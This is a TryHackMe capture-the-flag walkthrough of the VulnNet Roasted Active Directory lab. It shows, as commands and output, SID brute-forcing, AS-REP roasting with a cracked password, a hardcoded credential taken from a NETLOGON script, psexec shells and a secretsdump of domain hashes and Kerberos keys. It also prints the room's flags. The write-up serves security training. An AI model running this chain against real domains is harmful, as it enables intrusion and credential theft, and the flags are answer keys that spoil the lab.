# [TryHackMe-VulnNet-Roasted](https://tryhackme.com/room/vulnnetroasted)

VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.

- Difficulty: Easy
- Operating System: Windows

This is a much simpler machine, do not overthink. You can do it by following common methodologies.

Note: It might take up to 6 minutes for this machine to fully boot.

Icon made by DinosoftLabs from www.flaticon.com



# What is the user flag? (Desktop.txt)
## Services
Running a full Nmap scan will reveal several running services. Our target machine is a Windows machine, and the domain name is ```vulnnet-rst.local.```
~~~
➜  VulnNet_Roasted sudo nmap -sV -sC -T4 -oN nmap 10.10.109.209
[sudo] password for alpha: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-19 20:04 EST
Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.91% done; ETC: 20:05 (0:00:06 remaining)
Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.91% done; ETC: 20:06 (0:00:11 remaining)
Nmap scan report for 10.10.109.209
Host is up (0.26s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-19 14:05:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -10h59m52s
| smb2-time: 
|   date: 2023-11-19T14:07:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.40 seconds
~~~

# Samba
Starting with the Samba shares, we can use ```smbclient``` to list the network shares:
~~~
oasted smbclient -L 10.10.237.200
Password for [WORKGROUP\alpha]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
~~~
```smbmap``` will also reveal the permissions:
~~~
➜  VulnNet_Roasted smbmap -u anonymous -H 10.10.237.200

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.237.200:445       Name: 10.10.237.200             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
~~~
Can access the anonymous shares ```(VulnNet-Business-Anonymous``` and ```VulnNet-Enterprise-Anonymous)``` but they do not host any useful files.

## Find users

As we have a read access to IPC$ without authentication, we are able to list the domain users as anonymous:
~~~
➜  VulnNet_Roasted impacket-lookupsid anonymous@10.10.109.209 | tee users.txt             
Password:
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.10.109.209
[*] StringBinding ncacn_np:10.10.109.209[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
~~~
~~~
➜  VulnNet_Roasted grep SidTypeUser users.txt | awk '{print $2}' | cut -d "\\" -f2 > org_users.txt
➜  VulnNet_Roasted cat org_users.txt
j-leet
j-goldenhand
t-skid
a-whitehat
enterprise-core-vn
WIN-2BO8M1OE1M1
Administrator
krbtgt%                                                                                                                                             ➜  VulnNet_Roasted cat users.txt 
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
~~~
Now, let’s use ```GetNPUsers``` to find users without Kerberos pre-authentication:
~~~
➜  VulnNet_Roasted impacket-GetNPUsers -dc-ip 10.10.109.209 -usersfile users.txt  -no-pass  vulnnet-rst.local/ 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:4118f246d202f36a06eb472d346ff138$12e877ccb30df801861e4d00f52382cde2349769f7387f345110197edd076bed62caf1c98b4ff3777b87f0a842e980d9f284545626a048bdd9e5d687ae224223082676f00cda2b274dd82dcbabb1bb5747e52e76ba962f5e3927c68dd0e10089b5c70ac6157c38296b3afaae7f69731256417b961c2abeadad3cd4e108509ab7783840abb4631e75b67cad961736896ba712920e8b55a6dee6f6a9fdd135869a7cd5ca71208920dac06da051fb6236972f795c5373daae8ccff3b251cf1ad7cb5cc208052d8e8a50094c5e9ca6ac911e23a1711d472f3c29a764c37fbbdaacd32f6b8464f32d6d160da632665277fc35b0464c5c1cb2
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
~~~
## We have found ```t-skid```’s hash. Let’s crack it:
~~~
➜  VulnNet_Roasted john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:08 DONE (2023-11-19 20:39) 0.1124g/s 357536p/s 357536c/s 357536C/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~
- User: ```t-skid```
- Password: ```tj072889*```
## Samba authenticated access (```t-skid```)

Using these credentials, we are now able to connect to the ```NETLOGON``` Samba network share:
~~~
➜  VulnNet_Roasted smbclient -U vulnnet-rst.local/t-skid //10.10.109.209/NETLOGON
Password for [VULNNET-RST.LOCAL\t-skid]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8771839 blocks of size 4096. 4541976 blocks available
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> get ResetPassword.vb
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \ResetPassword.vb
smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> get ResetPassword.vbs -
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTNamegetting file \ResetPassword.vbs of size 2821 as - (3.1 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> 
smb: \> exit
~~~
i get this credentials in the VBS script:
~~~
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
~~~
# User flag
Let’s now use ```impacket-psexec``` to connect using the credentials found above.
~~~
➜  VulnNet_Roasted impacket-psexec vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@'10.10.237.200'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.237.200.....
[*] Found writable share ADMIN$
[*] Uploading file TBaxyEnS.exe
[*] Opening SVCManager on 10.10.237.200.....
[*] Creating service uLjR on 10.10.237.200.....
[*] Starting service uLjR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd c:\users
 
c:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users

11/19/2023  07:35 AM    <DIR>          .
11/19/2023  07:35 AM    <DIR>          ..
11/19/2023  07:36 AM    <DIR>          a-whitehat
03/13/2021  03:20 PM    <DIR>          Administrator
03/13/2021  03:42 PM    <DIR>          enterprise-core-vn
03/11/2021  07:36 AM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  17,589,559,296 bytes free

c:\Users> cd enterprise-core-vn
 
c:\Users\enterprise-core-vn> dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users\enterprise-core-vn

03/13/2021  03:42 PM    <DIR>          .
03/13/2021  03:42 PM    <DIR>          ..
03/13/2021  03:43 PM    <DIR>          Desktop
03/13/2021  03:42 PM    <DIR>          Documents
09/14/2018  11:19 PM    <DIR>          Downloads
09/14/2018  11:19 PM    <DIR>          Favorites
09/14/2018  11:19 PM    <DIR>          Links
09/14/2018  11:19 PM    <DIR>          Music
09/14/2018  11:19 PM    <DIR>          Pictures
09/14/2018  11:19 PM    <DIR>          Saved Games
09/14/2018  11:19 PM    <DIR>          Videos
               0 File(s)              0 bytes
              11 Dir(s)  17,589,469,184 bytes free

c:\Users\enterprise-core-vn> cd Desktop
 
c:\Users\enterprise-core-vn\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users\enterprise-core-vn\Desktop

03/13/2021  03:43 PM    <DIR>          .
03/13/2021  03:43 PM    <DIR>          ..
03/13/2021  03:43 PM                39 user.txt
               1 File(s)             39 bytes
               2 Dir(s)  17,589,456,896 bytes free

c:\Users\enterprise-core-vn\Desktop> type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}

c:\Users\enterprise-core-vn\Desktop>
~~~

# What is the system flag? (Desktop.txt)
## Dump hashes
Let’s use ```impacket-secretsdump``` to dump the hashes, using the credentials found.

~~~
➜  VulnNet_Roasted impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.109.209
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:7fd8e047b98f3fa18ddffec70bf587673e73411c201652e49a913de676b7a0fb
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:a523a434204da924ec179e6981f07fc6
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:ef83258f32abdfd0
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:9cc2e240882e02db04cf038bdc6c3f986120d1fc9d6097561fe490251469f51edae8cb0b0e9e508b692651489eca705ca8990a297bbca3b56f28ac11f348d4c82694a1b2f3f25711a010ce7aa183f34d80974c09707262f2402c37e4c9339e98c04e501212aebb15631565f92998e503f3a2a8a4b56af365577bf39c91ec6a54fd21b4d0c710dfec9f656b2638cc2eef9adada90b74a24f0c2df6b86403f2318c2c21ee8665a9e5be384db0cd02f6a1b96e97e42183369a070c25009c439d165de71ed289e78d8370d66a50ab5a11992a03fd2b016af4a53275e479b6f67bef82f4d797c85f4fa792012abfbb6e1f0d9
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:b0cbe7dcc6342e293f9b37ec5fe6f5b2:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
[*] NL$KM 
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:b0cbe7dcc6342e293f9b37ec5fe6f5b2:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:7fd8e047b98f3fa18ddffec70bf587673e73411c201652e49a913de676b7a0fb
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:a523a434204da924ec179e6981f07fc6
WIN-2BO8M1OE1M1$:des-cbc-md5:0257d5e016a2b55d
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
~~~
# System flag

Now that we have the administrator’s hash, we can use it to connect and get the sytem flag:
~~~
➜  VulnNet_Roasted impacket-psexec vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@'10.10.237.200'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.237.200.....
[*] Found writable share ADMIN$
[*] Uploading file QXVXdywg.exe
[*] Opening SVCManager on 10.10.237.200.....
[*] Creating service fSFJ on 10.10.237.200.....
[*] Starting service fSFJ.....
[!] Press help for extra shell commands
ls
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32> cd
cd c:/C:\Windows\system32
 
C:\Windows\system32> cd c:\users\administrator\desktop
The filename, directory name, or volume label syntax is incorrect.

C:\Windows\system32> cd ..\Desktop
The system cannot find the path specified.

C:\Windows\system32> cd C:\Users\Administrator\Desktop>
 
C:\Windows\system32> cd c:
C:\Windows\System32

C:\Windows\system32> cd c:\
 
c:\> cd \Users
 
c:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users

03/13/2021  03:42 PM    <DIR>          .
03/13/2021  03:42 PM    <DIR>          ..
03/13/2021  03:20 PM    <DIR>          Administrator
03/13/2021  03:42 PM    <DIR>          enterprise-core-vn
03/11/2021  07:36 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  17,150,853,120 bytes free

c:\Users> cd Administrator
 
c:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users\Administrator

03/13/2021  03:20 PM    <DIR>          .
03/13/2021  03:20 PM    <DIR>          ..
03/11/2021  09:38 AM    <DIR>          3D Objects
03/11/2021  09:38 AM    <DIR>          Contacts
03/13/2021  03:31 PM    <DIR>          Desktop
03/11/2021  09:38 AM    <DIR>          Documents
03/11/2021  09:38 AM    <DIR>          Downloads
03/11/2021  09:38 AM    <DIR>          Favorites
03/11/2021  09:38 AM    <DIR>          Links
03/11/2021  09:38 AM    <DIR>          Music
03/11/2021  09:38 AM    <DIR>          Pictures
03/11/2021  09:38 AM    <DIR>          Saved Games
03/11/2021  09:38 AM    <DIR>          Searches
03/11/2021  09:38 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  17,166,725,120 bytes free

c:\Users\Administrator> cd Desktop
 
c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users\Administrator\Desktop

03/13/2021  03:31 PM    <DIR>          .
03/13/2021  03:31 PM    <DIR>          ..
03/13/2021  03:34 PM                39 system.txt
               1 File(s)             39 bytes
               2 Dir(s)  17,593,917,440 bytes free

c:\Users\Administrator\Desktop> cat system.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

c:\Users\Administrator\Desktop> type system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}

c:\Users\Administrator\Desktop>
~~~
